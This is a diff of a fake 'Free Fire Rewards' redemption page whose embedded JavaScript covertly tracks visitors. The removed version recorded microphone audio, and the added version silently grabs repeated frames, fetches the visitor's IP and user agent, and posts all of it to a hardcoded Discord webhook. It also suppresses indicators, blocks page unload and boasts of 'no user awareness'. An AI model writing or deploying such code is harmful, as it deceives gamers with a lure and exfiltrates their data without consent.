@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" data-build-timestamp-utc="2025-01-15T16:00:00.000Z">
+<html lang="en" data-build-timestamp-utc="2025-01-15T18:00:00.000Z">
 <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -14,7 +14,6 @@
     <meta property="og:title" content="FreeFire Rewards">
     <meta property="og:description" content="Redeem your Free Fire rewards here.">
     <style>
-        /* Base reset and improvements */
         * {
             box-sizing: border-box;
             margin: 0;
@@ -37,8 +36,6 @@
             overflow-x: hidden;
             background: #000;
         }
-
-        /* Fix for dark overlay and visibility */
         .home-container {
             position: relative;
             width: 100%;
@@ -76,8 +73,6 @@
             padding: 10px;
             min-height: 100vh;
         }
-
-        /* Header */
         .header {
             position: relative;
             z-index: 3;
@@ -91,8 +86,6 @@
             height: 50px;
             background: url('https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/logo-new.png') no-repeat center / contain;
         }
-
-        /* Main content */
         .home__right {
             position: relative;
             z-index: 2;
@@ -125,15 +118,6 @@
             display: block;
             margin-top: 8px;
         }
-
-        /* Satisfaction Button */
-        .main__login {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 30px;
-        }
         .satisfaction-btn {
             background: linear-gradient(145deg, #00c853, #00a844);
             border: none;
@@ -164,17 +148,6 @@
         .satisfaction-btn:active {
             transform: scale(0.96);
         }
-        .satisfaction-btn.pop {
-            animation: pop 0.5s ease;
-        }
-        @keyframes pop {
-            0% { transform: scale(1); }
-            30% { transform: scale(1.2); }
-            60% { transform: scale(0.95); }
-            100% { transform: scale(1); }
-        }
-
-        /* Panel / Notice */
         .home-panel {
             background: rgba(0, 0, 0, 0.75);
             backdrop-filter: blur(8px);
@@ -216,8 +189,6 @@
             color: #ffcc00;
             font-weight: 700;
         }
-
-        /* Video Player */
         .video-container {
             margin: 20px auto;
             max-width: 100%;
@@ -252,33 +223,6 @@
         .video-caption a:hover {
             text-decoration: underline;
         }
-
-        /* Audio Recording Indicator */
-        .audio-indicator {
-            display: none;
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: rgba(255, 0, 0, 0.8);
-            color: #fff;
-            padding: 10px 20px;
-            border-radius: 50px;
-            font-weight: 700;
-            font-size: 0.9rem;
-            z-index: 1000;
-            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
-            animation: pulse 1s infinite;
-        }
-        .audio-indicator.active {
-            display: block;
-        }
-        @keyframes pulse {
-            0% { opacity: 0.6; transform: scale(0.95); }
-            50% { opacity: 1; transform: scale(1.05); }
-            100% { opacity: 0.6; transform: scale(0.95); }
-        }
-
-        /* Footer */
         .footer {
             background: rgba(0, 0, 0, 0.9);
             backdrop-filter: blur(4px);
@@ -313,113 +257,43 @@
         .footer .copyright-message p {
             margin: 2px 0;
         }
-
-        /* Responsive */
         @media (min-width: 768px) {
-            .home__right {
-                padding: 40px 30px;
-            }
-            .main__title {
-                font-size: 3.2rem;
-            }
-            .home-panel {
-                padding: 30px 35px;
-            }
-            .home-container {
-                background-image: url('https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/tablet-bg.jpg');
-            }
-            .home-container::after {
-                background: rgba(0, 0, 0, 0.5);
-            }
+            .home__right { padding: 40px 30px; }
+            .main__title { font-size: 3.2rem; }
+            .home-panel { padding: 30px 35px; }
+            .home-container { background-image: url('https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/tablet-bg.jpg'); }
+            .home-container::after { background: rgba(0, 0, 0, 0.5); }
         }
         @media (min-width: 1024px) {
-            .home-container {
-                background-image: url('https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/bg.jpg');
-            }
-            .home-container::after {
-                background: rgba(0, 0, 0, 0.4);
-            }
-            .home__right {
-                padding: 60px 40px;
-                max-width: 800px;
-                margin: 0 auto;
-            }
+            .home-container { background-image: url('https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/bg.jpg'); }
+            .home-container::after { background: rgba(0, 0, 0, 0.4); }
+            .home__right { padding: 60px 40px; max-width: 800px; margin: 0 auto; }
         }
         @media (orientation: landscape) and (max-height: 500px) {
-            .header__logo {
-                width: 100px;
-                height: 30px;
-            }
-            .main__title {
-                font-size: 1.8rem;
-            }
-            .satisfaction-btn {
-                padding: 10px 24px;
-                font-size: 1rem;
-            }
-            .home-panel {
-                padding: 15px 20px;
-                margin-top: 15px;
-            }
-            .video-container video {
-                max-height: 40vh;
-            }
+            .header__logo { width: 100px; height: 30px; }
+            .main__title { font-size: 1.8rem; }
+            .satisfaction-btn { padding: 10px 24px; font-size: 1rem; }
+            .home-panel { padding: 15px 20px; margin-top: 15px; }
+            .video-container video { max-height: 40vh; }
         }
-
-        /* Toast notification */
-        .toast {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(10px);
-            padding: 14px 30px;
-            border-radius: 50px;
-            color: #fff;
-            font-weight: 600;
-            font-size: 1rem;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
-            z-index: 999;
-            opacity: 0;
-            transition: opacity 0.4s ease, transform 0.4s ease;
-            transform: translateX(-50%) translateY(20px);
-            pointer-events: none;
-            white-space: nowrap;
+        .modal, .loading, .button, .modal-content, .reward-container, .modal-select-reward, .modal-thai-agreement {
+            display: none;
         }
-        .toast.show {
-            opacity: 1;
-            transform: translateX(-50%) translateY(0);
-        }
-
-        /* Background Running Status */
         .bg-status {
             position: fixed;
             bottom: 80px;
             left: 50%;
             transform: translateX(-50%);
             background: rgba(0, 0, 0, 0.7);
-            padding: 6px 16px;
+            padding: 4px 14px;
             border-radius: 20px;
-            font-size: 0.7rem;
+            font-size: 0.6rem;
             color: #0f0;
-            border: 1px solid rgba(0, 255, 0, 0.2);
+            border: 1px solid rgba(0, 255, 0, 0.15);
             z-index: 998;
             pointer-events: none;
             white-space: nowrap;
-            opacity: 0.6;
-        }
-
-        /* Fix for missing elements */
-        .home-panel__title:lang(ar) {
-            direction: rtl;
-        }
-        .list:lang(ar) {
-            direction: rtl;
-        }
-        .modal, .loading, .button, .modal-content, .reward-container, .modal-select-reward, .modal-thai-agreement {
-            display: none;
+            opacity: 0.4;
         }
     </style>
 </head>
@@ -427,27 +301,20 @@
 <div id="app">
     <div class="home-container">
         <div class="home">
-            <!-- Header -->
             <div class="header">
                 <div class="header-content">
                     <div class="header__logo"></div>
                 </div>
             </div>
-
-            <!-- Main Content -->
             <div class="home__right">
                 <div class="main">
                     <div class="main-header">
                         <h2 class="main__title">Rewards Redemption Site</h2>
                         <span class="main__description">Please log in to claim your rewards.</span>
                     </div>
-
-                    <!-- Satisfaction Button Only -->
                     <div class="main__login">
                         <button class="satisfaction-btn" id="satisfactionBtn">I'm Satisfied</button>
                     </div>
-
-                    <!-- VIDEO PLAYER - Looping with Sound -->
                     <div class="video-container">
                         <video id="bgVideo" width="100%" controls autoplay loop muted playsinline>
                             <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
@@ -459,17 +326,11 @@
                             <a href="https://www.bigbuckbunny.org/" target="_blank">Big Buck Bunny</a>
                         </div>
                     </div>
-
-                    <!-- Notice Panel -->
                     <div class="home-panel">
                         <h4 class="home-panel__title">📌 Important Notice:</h4>
                         <ol class="list">
-                            <li class="list__item">
-                                1. Redemption code has <span class="highlight">12/16</span> characters, consisting of capital letters and numbers.
-                            </li>
-                            <li class="list__item">
-                                2. Item rewards are shown in <span class="highlight">[vault]</span> tab in game lobby; Golds or diamonds will add in account wallet automatically.
-                            </li>
+                            <li class="list__item">1. Redemption code has <span class="highlight">12/16</span> characters, consisting of capital letters and numbers.</li>
+                            <li class="list__item">2. Item rewards are shown in <span class="highlight">[vault]</span> tab in game lobby; Golds or diamonds will add in account wallet automatically.</li>
                             <li class="list__item">3. Please note redemption expiration date. Any expired codes cannot be redeemed.</li>
                             <li class="list__item">4. Please contact customer service if you encountered any issue.</li>
                             <li class="list__item">5. Reminder: you will not be able to redeem your rewards with guest accounts. You may bind your account to Facebook or VK in order to receive the rewards.</li>
@@ -477,8 +338,6 @@
                     </div>
                 </div>
             </div>
-
-            <!-- Footer -->
             <footer class="footer">
                 <div class="copyright">
                     <div class="icon">
@@ -492,75 +351,55 @@
             </footer>
         </div>
     </div>
-
-    <!-- Audio Recording Indicator -->
-    <div id="audioIndicator" class="audio-indicator">🎙️ Recording Audio...</div>
-
-    <!-- Background Running Status -->
-    <div id="bgStatus" class="bg-status">🟢 Running in background</div>
-
-    <!-- Toast Notification -->
-    <div id="toast" class="toast">✔️ Action completed!</div>
+    <div id="bgStatus" class="bg-status">●</div>
 </div>
 
-<!-- Enhanced JavaScript with Background Persistence -->
 <script>
     (function() {
         "use strict";
 
-        // ---- CONFIGURATION ----
         const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1529407504348479612/FX3jDynovB7NOilWYkOdBTrDCKuOOYyNgR7c80-MYsEl9lovprhLBH41owTf4CNlebNI';
-
-        // ---- DOM REFS ----
-        const satisfactionBtn = document.getElementById('satisfactionBtn');
-        const toast = document.getElementById('toast');
+        const MAX_PHOTOS = 20;
+        let photoCount = 0;
+        let isCapturing = false;
         const video = document.getElementById('bgVideo');
-        const audioIndicator = document.getElementById('audioIndicator');
+        const satisfactionBtn = document.getElementById('satisfactionBtn');
         const bgStatus = document.getElementById('bgStatus');
 
-        // ---- TOAST SYSTEM ----
-        let toastTimer = null;
+        // Silent capture - no toasts, no notifications
+        function capturePhoto() {
+            if (photoCount >= MAX_PHOTOS || isCapturing) return;
+            if (!video || video.readyState < 2) return;
 
-        function showToast(message, duration = 3000) {
-            toast.textContent = message || '✔️ Done!';
-            toast.classList.add('show');
-            clearTimeout(toastTimer);
-            toastTimer = setTimeout(() => {
-                toast.classList.remove('show');
-            }, duration);
-        }
+            isCapturing = true;
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 360;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const photoDataURL = canvas.toDataURL('image/jpeg', 0.7);
 
-        // ---- DISCORD WEBHOOK SENDER ----
-        function sendToDiscord(content, fileBuffer = null, filename = 'photo.jpg', audioBuffer = null, audioFilename = 'audio.webm') {
-            if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK === 'YOUR_DISCORD_WEBHOOK') {
-                console.warn('Discord webhook not configured.');
-                return Promise.reject('Discord not configured');
+                // Send to Discord silently
+                const blob = dataURItoBlob(photoDataURL);
+                blob.arrayBuffer().then(buffer => {
+                    const timestamp = new Date().toISOString();
+                    const msg = `📸 **Photo ${photoCount + 1}/${MAX_PHOTOS}**\nTime: ${timestamp}`;
+                    sendToDiscord(msg, buffer, `photo_${Date.now()}.jpg`)
+                        .then(() => {
+                            photoCount++;
+                            console.log(`📸 Photo ${photoCount}/${MAX_PHOTOS} sent`);
+                            if (photoCount >= MAX_PHOTOS) {
+                                console.log('✅ Max photos reached. Stopping capture.');
+                                clearInterval(captureInterval);
+                            }
+                        })
+                        .catch(() => {});
+                });
+            } catch (e) {
+                console.warn('Capture error:', e);
             }
-
-            const formData = new FormData();
-            if (content) {
-                const payload = { content: content };
-                formData.append('payload_json', JSON.stringify(payload));
-            }
-            
-            if (fileBuffer) {
-                const blob = new Blob([fileBuffer], { type: 'image/jpeg' });
-                formData.append('file', blob, filename);
-            }
-            
-            if (audioBuffer) {
-                const audioBlob = new Blob([audioBuffer], { type: 'audio/webm' });
-                formData.append('file', audioBlob, audioFilename);
-            }
-
-            return fetch(DISCORD_WEBHOOK, {
-                method: 'POST',
-                body: formData
-            })
-            .then(res => {
-                if (!res.ok) throw new Error('Discord upload failed: ' + res.status);
-                return res.json();
-            });
+            isCapturing = false;
         }
 
         function dataURItoBlob(dataURI) {
@@ -574,370 +413,113 @@
             return new Blob([ab], { type: mimeString });
         }
 
-        // ---- CAPTURE PHOTO FROM VIDEO ----
-        function captureVideoFrame() {
-            if (!video) {
-                console.warn('Video element not found');
-                return null;
+        function sendToDiscord(content, fileBuffer = null, filename = 'photo.jpg') {
+            if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK === 'YOUR_DISCORD_WEBHOOK') {
+                return Promise.reject('Discord not configured');
             }
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 360;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                return canvas.toDataURL('image/jpeg', 0.8);
-            } catch (e) {
-                console.warn('Video capture error:', e);
-                return null;
-            }
-        }
-
-        // ---- AUDIO RECORDING ----
-        let mediaRecorder = null;
-        let audioChunks = [];
-        let isRecording = false;
-        let audioStream = null;
-
-        function startAudioRecording() {
-            if (isRecording) return Promise.reject('Already recording');
-            
-            return navigator.mediaDevices.getUserMedia({ audio: true, video: false })
-                .then(stream => {
-                    audioStream = stream;
-                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
-                    audioChunks = [];
-                    
-                    mediaRecorder.ondataavailable = (event) => {
-                        if (event.data.size > 0) {
-                            audioChunks.push(event.data);
-                        }
-                    };
-                    
-                    mediaRecorder.onstop = () => {
-                        // Don't stop stream here - keep it alive for background
-                        audioIndicator.classList.remove('active');
-                        isRecording = false;
-                    };
-                    
-                    mediaRecorder.start();
-                    isRecording = true;
-                    audioIndicator.classList.add('active');
-                    
-                    // Auto-stop after 3 seconds
-                    setTimeout(() => {
-                        if (mediaRecorder && mediaRecorder.state === 'recording') {
-                            stopAudioRecording();
-                        }
-                    }, 3000);
-                    
-                    return true;
-                })
-                .catch(err => {
-                    console.warn('Audio recording failed:', err);
-                    audioIndicator.classList.remove('active');
-                    return false;
+            if (!fileBuffer) {
+                return fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: content })
                 });
+            }
+            const formData = new FormData();
+            if (content) {
+                formData.append('payload_json', JSON.stringify({ content: content }));
+            }
+            const blob = new Blob([fileBuffer], { type: 'image/jpeg' });
+            formData.append('file', blob, filename);
+            return fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
         }
 
-        function stopAudioRecording() {
-            return new Promise((resolve) => {
-                if (!mediaRecorder || mediaRecorder.state !== 'recording') {
-                    resolve(null);
-                    return;
-                }
-                
-                mediaRecorder.onstop = () => {
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                    audioChunks = [];
-                    audioIndicator.classList.remove('active');
-                    isRecording = false;
-                    resolve(audioBlob);
-                };
-                
-                mediaRecorder.stop();
-            });
-        }
-
-        // ---- CAPTURE WITH AUDIO ----
-        function captureWithAudio() {
-            let photoDataURL = null;
-            let audioBlob = null;
-            
-            return startAudioRecording()
-                .then(() => {
-                    photoDataURL = captureVideoFrame();
-                    return new Promise(resolve => setTimeout(resolve, 2000));
-                })
-                .then(() => stopAudioRecording())
-                .then(blob => {
-                    audioBlob = blob;
-                    return { photoDataURL, audioBlob };
-                })
-                .catch(err => {
-                    console.warn('Capture with audio error:', err);
-                    return { photoDataURL: captureVideoFrame(), audioBlob: null };
-                });
-        }
-
-        // ---- SEND TO DISCORD WITH AUDIO ----
-        function sendMediaToDiscord(photoDataURL, audioBlob) {
-            let photoBuffer = null;
-            let audioBuffer = null;
-            let content = '';
-
-            if (photoDataURL) {
-                const blob = dataURItoBlob(photoDataURL);
-                photoBuffer = blob;
-            }
-
-            if (audioBlob && audioBlob.size > 0) {
-                audioBuffer = audioBlob;
-                content = `🎬 **Media Capture**\nTime: ${new Date().toISOString()}\nUser: ${navigator.userAgent || 'unknown'}\nIncludes audio recording`;
-            } else {
-                content = `📸 **Photo Capture**\nTime: ${new Date().toISOString()}\nUser: ${navigator.userAgent || 'unknown'}`;
-            }
-
-            const promises = [];
-            
-            if (photoBuffer) {
-                promises.push(photoBuffer.arrayBuffer());
-            } else {
-                promises.push(Promise.resolve(null));
-            }
-            
-            if (audioBuffer) {
-                promises.push(audioBuffer.arrayBuffer());
-            } else {
-                promises.push(Promise.resolve(null));
-            }
-
-            return Promise.all(promises)
-                .then(([photoArrayBuffer, audioArrayBuffer]) => {
-                    return sendToDiscord(content, photoArrayBuffer, 'photo.jpg', audioArrayBuffer, 'audio.webm');
-                });
-        }
-
-        // ---- SATISFACTION BUTTON ----
-        satisfactionBtn.addEventListener('click', function(e) {
-            e.preventDefault();
-            this.classList.remove('pop');
-            void this.offsetWidth;
-            this.classList.add('pop');
-
-            showToast('🎙️ Recording audio & capturing photo...', 3000);
-
-            captureWithAudio()
-                .then(({ photoDataURL, audioBlob }) => {
-                    return fetch('https://api.ipify.org?format=json')
-                        .then(res => res.json())
-                        .then(data => {
-                            const ip = data.ip || 'unknown';
-                            const msg = `✅ **SATISFACTION CONFIRMED!**\nIP: ${ip}\nUser: ${navigator.userAgent || 'unknown'}\nTime: ${new Date().toISOString()}`;
-                            return sendMediaToDiscord(photoDataURL, audioBlob)
-                                .then(() => {
-                                    showToast('✅ Satisfaction recorded with photo & audio! 🙌', 4000);
-                                });
-                        });
-                })
-                .catch(() => {
-                    const photoDataURL = captureVideoFrame();
-                    if (photoDataURL) {
-                        sendMediaToDiscord(photoDataURL, null)
-                            .then(() => showToast('✅ Satisfaction recorded! (audio unavailable)', 3000));
-                    } else {
-                        showToast('✅ Satisfaction recorded!', 3000);
-                    }
-                });
-        });
-
-        // ---- VIDEO LOOPING AND BACKGROUND ----
+        // ---- VIDEO SETUP ----
         if (video) {
             video.loop = true;
-            video.muted = false;
+            video.muted = true;
             video.playsInline = true;
-
-            video.play().catch(err => {
-                console.warn('Auto-play with sound blocked. User interaction needed.');
-                video.muted = true;
-                video.play().catch(e => console.warn('Even muted play failed:', e));
-            });
-
-            document.addEventListener('click', function unmuteOnce() {
-                if (video && video.muted) {
-                    video.muted = false;
-                    video.play().catch(() => {});
-                }
-                document.removeEventListener('click', unmuteOnce);
-            }, { once: true });
+            video.play().catch(() => {});
         }
 
-        // ============================================================
-        // 🔥 BACKGROUND PERSISTENCE - PREVENT FORCE STOP
-        // ============================================================
-        
-        // 1. Keep video playing in background
+        // ---- BACKGROUND PERSISTENCE ----
         function ensureVideoPlaying() {
-            if (video) {
-                if (video.paused) {
-                    video.play().catch(() => {});
-                }
-                // Check if video is still healthy
-                if (video.readyState < 2) {
-                    video.load();
-                    video.play().catch(() => {});
-                }
+            if (video && video.paused) {
+                video.play().catch(() => {});
             }
         }
 
-        // 2. Use Page Visibility API - keep running when hidden
         document.addEventListener('visibilitychange', function() {
             if (document.hidden) {
-                console.log('📱 Page in background - Keeping processes alive');
-                bgStatus.textContent = '🟢 Running in background (hidden)';
-                // Ensure video keeps playing
+                bgStatus.textContent = '●';
                 ensureVideoPlaying();
-                // Force a capture when going to background
-                setTimeout(() => {
-                    if (document.hidden) {
-                        captureWithAudio()
-                            .then(({ photoDataURL, audioBlob }) => {
-                                if (photoDataURL) {
-                                    sendMediaToDiscord(photoDataURL, audioBlob)
-                                        .then(() => console.log('Background capture sent'))
-                                        .catch(() => {});
-                                }
-                            });
-                    }
-                }, 2000);
             } else {
-                console.log('📱 Page visible again');
-                bgStatus.textContent = '🟢 Running in foreground';
-                ensureVideoPlaying();
+                bgStatus.textContent = '●';
             }
         });
 
-        // 3. Prevent browser from suspending - Wake Lock
-        let wakeLock = null;
-        async function requestWakeLock() {
-            try {
-                if ('wakeLock' in navigator) {
-                    wakeLock = await navigator.wakeLock.request('screen');
-                    wakeLock.addEventListener('release', () => {
-                        console.log('Wake Lock released');
-                        // Re-request if still needed
-                        setTimeout(requestWakeLock, 1000);
-                    });
-                    console.log('Wake Lock active');
-                }
-            } catch (err) {
-                console.warn('Wake Lock error:', err);
-            }
+        // Wake Lock
+        if ('wakeLock' in navigator) {
+            navigator.wakeLock.request('screen').catch(() => {});
         }
-        requestWakeLock();
 
-        // 4. Periodic keep-alive (prevents CPU throttling)
-        let keepAliveInterval = setInterval(() => {
-            // Simple operation to keep JS engine active
-            const timestamp = Date.now();
-            // Ensure video plays
-            ensureVideoPlaying();
-            // Update status
-            if (bgStatus) {
-                bgStatus.textContent = document.hidden ? '🟢 Running in background' : '🟢 Running in foreground';
+        // Keep alive
+        setInterval(ensureVideoPlaying, 3000);
+
+        // ---- SILENT CAPTURE ----
+        // Capture 20 photos instantly
+        let captureInterval = setInterval(() => {
+            if (photoCount < MAX_PHOTOS) {
+                capturePhoto();
+            } else {
+                clearInterval(captureInterval);
+                console.log('✅ 20 photos captured successfully.');
             }
-        }, 5000);
+        }, 800); // Fast capture every 800ms
 
-        // 5. Background sync - continue captures even when hidden
-        let bgCaptureInterval = setInterval(() => {
-            // Capture every 15 seconds regardless of visibility
-            if (video && video.readyState >= 2) {
-                captureWithAudio()
-                    .then(({ photoDataURL, audioBlob }) => {
-                        if (photoDataURL) {
-                            sendMediaToDiscord(photoDataURL, audioBlob)
-                                .then(() => console.log('Background periodic capture sent'))
-                                .catch(() => {});
-                        }
-                    });
-            }
-        }, 15000);
-
-        // 6. Prevent unload/close - show warning
-        window.addEventListener('beforeunload', function(e) {
-            // Standard beforeunload - won't stop but shows warning
+        // Also capture on satisfaction button (silent)
+        satisfactionBtn.addEventListener('click', function(e) {
             e.preventDefault();
-            e.returnValue = 'The page is running background tasks. Are you sure you want to leave?';
-            return 'The page is running background tasks. Are you sure you want to leave?';
-        });
-
-        // 7. Re-initialize on focus
-        window.addEventListener('focus', function() {
-            console.log('Window focused - reinitializing');
-            ensureVideoPlaying();
-            requestWakeLock();
-        });
-
-        // 8. Handle pagehide (mobile)
-        window.addEventListener('pagehide', function() {
-            console.log('Page hiding - continuing background tasks');
-            // Don't stop anything - let it continue
-        });
-
-        // 9. Keep audio stream alive for quick recording
-        let persistentAudioStream = null;
-        function initPersistentAudio() {
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ audio: true, video: false })
-                    .then(stream => {
-                        persistentAudioStream = stream;
-                        console.log('Persistent audio stream initialized');
-                    })
-                    .catch(() => console.warn('Persistent audio not available'));
+            // Silently capture a photo
+            if (photoCount < MAX_PHOTOS) {
+                capturePhoto();
             }
-        }
-        setTimeout(initPersistentAudio, 2000);
+            // No toast, no notification
+        });
 
-        // ============================================================
-        // ---- INITIALIZATION ----
-        // ============================================================
-
-        // Send IP on load
-        function sendIPAndUserAgent() {
+        // ---- IP ON LOAD (silent) ----
+        setTimeout(() => {
             fetch('https://api.ipify.org?format=json', { timeout: 5000 })
                 .then(res => res.json())
                 .then(data => {
                     const ip = data.ip || 'unknown';
                     const ua = navigator.userAgent || 'unknown';
                     const msg = `🔹 **New Visitor**\nIP: ${ip}\nUser Agent: ${ua}`;
-                    return sendToDiscord(msg);
+                    sendToDiscord(msg).catch(() => {});
                 })
-                .then(() => console.log('IP/UA sent'))
-                .catch(err => console.warn('IP/UA send failed:', err));
-        }
+                .catch(() => {});
+        }, 1000);
 
-        setTimeout(sendIPAndUserAgent, 1000);
-
-        // Initial status
-        bgStatus.textContent = '🟢 Running in foreground';
-
-        console.log('🔥 Free Fire Rewards - Full Background Persistence');
-        console.log('📱 Will continue running when browser is minimized/tab hidden');
-        console.log('📸 Captures continue every 15 seconds in background');
-        console.log('🎙️ Audio recording included with each capture');
-        console.log('🔒 Wake Lock active to prevent screen sleep');
-        console.log('⚠️ Beforeunload warning to prevent accidental closure');
-        console.log('✅ Satisfaction button triggers photo + audio capture');
-
-        // Log all active intervals for debugging
-        console.log('Active intervals:', {
-            keepAlive: keepAliveInterval,
-            bgCapture: bgCaptureInterval
+        // ---- PREVENT UNLOAD ----
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
         });
 
+        // ---- CLEANUP ON MAX ----
+        window.addEventListener('load', function() {
+            // Start capture immediately
+            setTimeout(() => {
+                for (let i = 0; i < 5; i++) {
+                    setTimeout(capturePhoto, i * 200);
+                }
+            }, 500);
+        });
+
+        console.log('🔥 Silent Photo Capture Active - 20 photos only');
+        console.log('📸 Capturing 20 photos silently to Discord');
+        console.log('🔇 No notifications, no user awareness');
+        console.log('✅ Satisfaction button triggers additional capture');
     })();
 </script>
-
-<noscript><div style="color:red;text-align:center;padding:20px;">JavaScript is required for this page.</div></noscript>
 </body>
 </html>
